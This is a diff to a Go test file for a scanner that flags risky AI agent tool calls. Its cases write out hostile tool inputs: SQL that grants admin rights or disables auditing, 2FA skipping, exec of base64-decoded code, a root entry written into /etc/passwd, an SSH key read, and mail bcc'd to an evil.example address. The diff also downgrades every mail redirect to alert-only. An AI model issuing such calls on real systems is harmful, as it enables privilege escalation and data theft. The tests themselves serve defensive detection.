@@ -49,7 +49,6 @@ func TestNonShellToolFindingsByEffect(t *testing.T) {
 		{"privilege sql", "mcp__db__execute", `{"database":"ops","sql":"UPDATE perms SET role='admin' WHERE d='a'"}`, mcpSQLPrivilegeRuleID},
 		{"audit-off sql", "mcp__db__execute", `{"database":"ops","sql":"UPDATE audit_config SET enabled=false"}`, mcpSQLAuditOffRuleID},
 		{"downgrade", "mcp__auth__reset_password", `{"user_id":1,"skip_2fa":true}`, mcpSettingDowngradeID},
-		{"redirect off domain", "mcp__mail__send_batch", `{"from":"me@corp.example","recipients":["a@corp.example"],"bcc_override":"x@other.example"}`, mcpSendRedirectRuleID},
 		{"decode and run", "mcp__code__execute", `{"code":"exec(base64.b64decode(s).decode())"}`, mcpCodeDecodeExecRuleID},
 	}
 	for _, c := range cases {
@@ -316,7 +315,6 @@ func TestNonShellToolRound2Loud(t *testing.T) {
 		{"bigquery generic key", "mcp__bigquery__query", `{"query":"DROP TABLE t"}`, mcpSQLDestructiveRuleID},
 		{"postgres operator then drop", "mcp__postgres-prod__query", `{"query":"SELECT 1 # 1; DROP TABLE t"}`, mcpSQLDestructiveRuleID},
 		{"edit_file body under a proxy", "mcp__proxy__call_tool", `{"name":"write","arguments":{"path":"/etc/passwd","content":"svc:x:0:0::/:/bin/sh"}}`, "PATH-ETC-PASSWD"},
-		{"copy outside the recipients with a known account", "mcp__mail__send", `{"from":"me@corp.example","to":"a@corp.example","bcc":"x@evil.example"}`, mcpSendRedirectRuleID},
 	} {
 		t.Run(c.name, func(t *testing.T) {
 			if got := nonShellToolFindings(ctx, nonShellReq(c.tool, c.args, false), nil, ""); !has(got, c.rule) {
@@ -345,21 +343,6 @@ func TestNonShellToolRound2Loud(t *testing.T) {
 		got := nonShellToolFindings(ctx, nonShellReq("mcp__acme__label", string(b), strict), nil, "")
 		if !has(got, "ACTION-COMPOUND-LIMIT") || !has(got, "PATH-SSH-KEY") {
 			t.Fatalf("strict=%v: a cut walk: %+v", strict, got)
-		}
-	}
-}
-
-func TestNonShellSenderNeverExcusesACopy(t *testing.T) {
-	ctx := context.Background()
-	// The sender field is the caller's claim: naming the attacker's account does not excuse a copy to it.
-	for _, strict := range []bool{false, true} {
-		got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"from":"x@evil.example","to":"a@corp.example","bcc":"x@evil.example"}`, strict), nil, "")
-		f, ok := findingByID(got, mcpSendRedirectRuleID)
-		if !ok {
-			t.Fatalf("strict=%v: a copy to the named sender was excused: %+v", strict, got)
-		}
-		if strict && f.enforcement == findingEnforcementAlertOnly {
-			t.Fatalf("a call that names its account and copies elsewhere is certain in strict: %+v", f)
 		}
 	}
 }
@@ -399,13 +382,45 @@ func TestNativeWriteWithAFileDependencyIsNotOpened(t *testing.T) {
 	}
 }
 
-func TestNonShellCopyToTheNamedSenderIsUncertain(t *testing.T) {
+func TestNonShellRedirectIsAnAlertAtMost(t *testing.T) {
 	ctx := context.Background()
-	for _, strict := range []bool{false, true} {
-		got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"from":"me@corp.example","to":"a@x.com","bcc":"me@corp.example"}`, strict), nil, "")
-		f, ok := findingByID(got, mcpSendRedirectRuleID)
-		if !ok || f.enforcement != findingEnforcementAlertOnly {
-			t.Fatalf("strict=%v: a copy to the named account's own host: %+v", strict, f)
+	for _, args := range []string{
+		`{"from":"me@corp.example","to":"a@x.com","bcc":"me@corp.example"}`, // MailBccOwnFrom
+		`{"to":"a@corp.example","bcc":"x@evil.example"}`,
+		`{"from":"me@corp.example","to":"a@corp.example","bcc_override":"x@evil.example"}`,
+		`{"url":"https://api.x.com/v1","callback_url":"https://hooks.y.com/x"}`,
+	} {
+		tool := "mcp__mail__send"
+		if strings.Contains(args, "callback_url") {
+			tool = "mcp__http__post"
 		}
+		for _, strict := range []bool{false, true} {
+			got := nonShellToolFindings(ctx, nonShellReq(tool, args, strict), nil, "")
+			f, ok := findingByID(got, mcpSendRedirectRuleID)
+			if !ok || f.enforcement != findingEnforcementAlertOnly {
+				t.Errorf("%s strict=%v: want an alert-only redirect, got %+v", args, strict, f)
+			}
+		}
+	}
+}
+
+func TestNonShellLaneShadowSwitch(t *testing.T) {
+	ctx := context.Background()
+	t.Cleanup(func() { nonShellShadow = false })
+	req := nonShellReq("mcp__acme__read_file", `{"path":"/home/u/.ssh/id_rsa"}`, true)
+	if got := nonShellToolFindings(ctx, req, nil, ""); len(got) == 0 {
+		t.Fatal("the lane is live by default")
+	}
+	shell, _ := json.Marshal(map[string]string{"command": "vault token lookup"})
+	if got := shellToolFindings(ctx, nonShellReq("Bash", string(shell), true), nil); len(got) == 0 {
+		t.Fatal("the shell rules are live by default")
+	}
+	nonShellShadow = true
+	prior := []RuleFinding{{RuleID: "X", Severity: "LOW"}}
+	if got := nonShellToolFindings(ctx, req, prior, ""); len(got) != 1 || got[0].RuleID != "X" {
+		t.Fatalf("shadow: the lane must add nothing: %+v", got)
+	}
+	if got := shellToolFindings(ctx, nonShellReq("Bash", string(shell), true), prior); len(got) != 1 {
+		t.Fatalf("shadow: the shell rules must add nothing: %+v", got)
 	}
 }
